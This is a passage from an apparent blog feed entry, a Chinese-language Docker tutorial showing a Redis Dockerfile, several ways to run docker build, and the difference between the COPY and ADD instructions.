class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:jessie</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> buildDeps=<span class="string">'gcc libc6-dev make'</span> \</span></span><br><span class="line"><span class="bash">&amp;&amp; apt-get update \</span></span><br><span class="line"><span class="bash">&amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="bash">&amp;&amp; wget -O redis.tar.gz <span class="string">"http://download.redis.io/releases/r</span></span></span><br><span class="line">edis-<span class="number">3.2</span>.<span class="number">5</span>.tar.gz<span class="string">" \</span></span><br><span class="line"><span class="string">&amp;&amp; mkdir -p /usr/src/redis \</span></span><br><span class="line"><span class="string">&amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-component</span></span><br><span class="line"><span class="string">s=1 \</span></span><br><span class="line"><span class="string">&amp;&amp; make -C /usr/src/redis \</span></span><br><span class="line"><span class="string">&amp;&amp; make -C /usr/src/redis install \</span></span><br><span class="line"><span class="string">&amp;&amp; rm -rf /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="string">&amp;&amp; rm redis.tar.gz \</span></span><br><span class="line"><span class="string">&amp;&amp; rm -r /usr/src/redis \</span></span><br><span class="line"><span class="string">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span></span><br></pre></td></tr></table></figure><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>在 Dockerfile 文件所在目录执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t nginx:v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">Step 1 : FROM nginx</span><br><span class="line">---&gt; e43d811ce2f4</span><br><span class="line">Step 2 : RUN <span class="built_in">echo</span> <span class="string">'&lt;h1&gt;Hello, Docker!&lt;/h1&gt;'</span> &gt; /usr/share/nginx/h</span><br><span class="line">tml/index.html</span><br><span class="line">---&gt; Running <span class="keyword">in</span> 9cdc27646c7b</span><br><span class="line">---&gt; 44aa4490ce2c</span><br><span class="line">Removing intermediate container 9cdc27646c7b</span><br><span class="line">Successfully built 44aa4490ce2c</span><br></pre></td></tr></table></figure><ul><li><code>.</code> 指的是上下文（context）</li></ul><h3 id="其它-docker-build-的用法"><a href="#其它-docker-build-的用法" class="headerlink" title="其它 docker build 的用法"></a>其它 docker build 的用法</h3><h4 id="直接用-Git-repo-进行构建"><a href="#直接用-Git-repo-进行构建" class="headerlink" title="直接用 Git repo 进行构建"></a>直接用 Git repo 进行构建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker build https://github.com/twang2218/gitlab-ce-zh.git#:8.</span><br><span class="line">14</span><br><span class="line">docker build https://github.com/twang2218/gitlab-ce-zh.git\#:8.14</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">Step 1 : FROM gitlab/gitlab-ce:8.14.0-ce.0</span><br><span class="line">8.14.0-ce.0: Pulling from gitlab/gitlab-ce</span><br><span class="line">aed15891ba52: Already exists</span><br><span class="line">773ae8583d14: Already exists</span><br></pre></td></tr></table></figure><h4 id="用给定的-tar-压缩包构建"><a href="#用给定的-tar-压缩包构建" class="headerlink" title="用给定的 tar 压缩包构建"></a>用给定的 tar 压缩包构建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build http://server/context.tar.gz</span><br></pre></td></tr></table></figure><h4 id="从标准输入中读取-Dockerfile-进行构建"><a href="#从标准输入中读取-Dockerfile-进行构建" class="headerlink" title="从标准输入中读取 Dockerfile 进行构建"></a>从标准输入中读取 Dockerfile 进行构建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build - &lt; Dockerfile</span><br><span class="line">或者</span><br><span class="line">cat Dockerfile | docker build -</span><br></pre></td></tr></table></figure><ul><li>这种形式由于直接从标准输入中读取 Dockerfile 的内容，它没有上下文，因此不可以像其他方法那样可以将本地文件 COPY 进镜像之类的事情。</li></ul><h4 id="从标准输入中读取上下文压缩包进行构建"><a href="#从标准输入中读取上下文压缩包进行构建" class="headerlink" title="从标准输入中读取上下文压缩包进行构建"></a>从标准输入中读取上下文压缩包进行构建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build - &lt; context.tar.gz</span><br></pre></td></tr></table></figure><h2 id="Dockerfile-指令详解"><a href="#Dockerfile-指令详解" class="headerlink" title="Dockerfile 指令详解"></a>Dockerfile 指令详解</h2><h3 id="COPY-复制文件"><a href="#COPY-复制文件" class="headerlink" title="COPY 复制文件"></a>COPY 复制文件</h3><p>格式：</p><ul><li>COPY &lt;源路径&gt;… &lt;目标路径&gt;</li><li>COPY [“&lt;源路径1&gt;”,… “&lt;目标路径&gt;”]</li></ul><p>COPY 指令将从构建上下文目录中 &lt;源路径&gt; 的文件/目录复制到新的一层的镜像<br>内的 &lt;目标路径&gt; 位置。</p><p><code>COPY package.json /usr/src/app/</code></p><p>&lt;源路径&gt; 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的<br>filepath.Match 规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY hom* /mydir/</span><br><span class="line">COPY hom?.txt /mydir/</span><br></pre></td></tr></table></figure><p>&lt;目标路径&gt; 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工<br>作目录可以用 WORKDIR 指令来指定）。目标路径不需要事先创建，如果目录不存<br>在会在复制文件前先行创建缺失目录。</p><p>此外，还需要注意一点，使用 COPY 指令，源文件的各种元数据都会保留。比如<br>读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建<br>相关文件都在使用 Git 进行管理的时候。</p><h3 id="ADD-更高级的复制文件"><a href="#ADD-更高级的复制文件" class="headerlink" title="ADD 更高级的复制文件"></a>ADD 更高级的复制文件</h3><p>ADD 指令和 COPY 的格式和性质基本一致。但是在 COPY 基础上增加了一些<br>功能。</p><ul><li>比如 &lt;源路径&gt; 可以是一个 URL ，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 &lt;目标路径&gt; 去。下载后的文件权限自动设置为 600 ，如果这并不是想要的权限，那么还需要增加额外的一层 RUN 进行权限调整，另外，如果下载的是个压缩包，需要解压缩，也一样还需要额外的一层 RUN 指令进行解压缩。所以不如直接使用 RUN 指令，然后使用 wget 或者 curl 工具下载，处理权限、解压缩、然后清理无用文件更合理。因此，这个功能其实并不实用，而且不推荐使用。</li><li>如果 &lt;源路径&gt; 为一个 tar 压缩文件的话，压缩格式为 gzip , bzip2 以及<br>xz 的情况下， ADD 指令将会自动解压缩这个压缩文件到 &lt;目标路径&gt; 去。</li><li>ADD 指令会令镜像构建缓存失效，从而可能会令镜像构建变<br>得比较缓慢。</li></ul><p><strong>因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 COPY 指令，仅在需要自动解压缩的场合使用 ADD 。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Docker&quot;&gt;&lt;a href=&quot;#Docker&quot; class=&quot;headerlink&quot; title=&quot;Docker&quot;&gt;&lt;/a&gt;Docker&lt;/h1&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
